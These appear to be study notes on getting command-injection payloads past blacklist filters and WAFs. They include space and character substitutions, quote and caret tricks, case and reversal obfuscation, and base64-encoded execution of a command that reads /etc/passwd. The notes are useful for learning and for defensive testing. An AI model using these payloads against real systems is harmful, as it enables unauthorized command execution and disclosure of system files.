# Identifying Filters

## Filter/WAF
- If we see error message in the field where output is displayed, means it was detected and prevented by the PHP **web app** itself
- If error message displayed **different page**, with info like our ip and request, may indicate **WAF**

## Blacklist bypassing
eg. in Backend,
```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```
- Should try to identify the blacklisted character

Character Blacklist Bypasses
- Remember to encode everything as URL-encoded character!
- Bypassing space blacklist
	- Using Tabs instead of spaces
		- `%09`
	- Using $IFS
		- `${IFS}
		- No need to further encode this
		- Linux Environment Variable 
	- Using Brace Expansion
		- `{ls,-la}`
		- No need to further encode this
- Bypassing other characeters
	- Linux
		- Take a character out of the environment variable
		- Bypass `\`
			- `echo ${PATH:0:1}`
		- Bypass `;`
			- `echo ${LS_COLORS:10:1}`
		- The above techniques can be used for other characters, just use `printenv` to see environment variables
	- Windows
		- Similar concept
		- Bypass `\` in Windows CMD
			- `echo %HOMEPATH:~6,-11%`
		- Bypass `\` in PowerShell
			- `$env:HOMEPATH[0]`

Command Blacklist Bypasses
- Both Linux and Windows
	- Add quotes
		- eg. `w'h'o'am'i`
		- Note: cannot mix types of quotes (' vs ""), number of quotes must be even
- Linux
	- Add characers like `\` and `$@`
- Windows
	- Add `^`

### Advanced Command Obfuscation
- Case manipulation
	- Windows
		- Can just change casing since commands are case-insensitive
		- `WhOamI`
	- Linux
		- Case sensitive, need to turn into all-lowercase word
		- `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
		- `$(a="WhOaMi";printf %s "${a,,}")`
		- Remember to still apply techniques from previous section to replace things like 'space' if needed
- Reversing commands
	- Linux
		- `echo 'whoami' | rev`
			- To get the reverse
		- `$(rev<<<'imaohw')`
	- Windows
		- `"whoami"[-1..-20] -join ''` 
			- To get the reverse
		- `iex "$('imaohw'[-1..-20] -join '')"`
- Encoding commands
	- Linux
		- `echo -n 'cat /etc/passwd | grep 33' | base64
			- To get the encoded output
		- `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
			- Use `<<<` instead of `|` since `|` is filtered
	- Windows
		- `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
			- To get encoding
		- `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`''
- More ways
	- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion